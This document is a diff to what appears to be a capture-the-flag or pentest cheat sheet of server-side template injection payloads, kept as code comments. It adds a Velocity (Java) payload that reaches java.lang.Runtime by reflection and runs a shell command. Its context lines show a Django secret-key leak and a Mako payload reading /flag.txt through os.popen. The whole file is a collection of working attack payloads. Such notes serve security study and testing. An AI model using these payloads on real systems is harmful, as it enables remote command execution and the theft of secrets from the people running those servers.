@@ -35,6 +35,15 @@
 // {% debug %}
 // {{settings.SECRET_KEY}}
 //* java
+// #set($x='')##
+// #set($rt=$x.class.forName('java.lang.Runtime'))##
+// #set($chr=$x.class.forName('java.lang.Character'))##
+// #set($str=$x.class.forName('java.lang.String'))##
+//
+// #set($ex=$rt.getRuntime().exec('ls'))##
+// $ex.waitFor()
+// #set($out=$ex.getInputStream())##
+//? note :
 // https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java
 //* python mako
 // ${self.template.__init__.__globals__['os'].popen('cat+/flag.txt').read()}
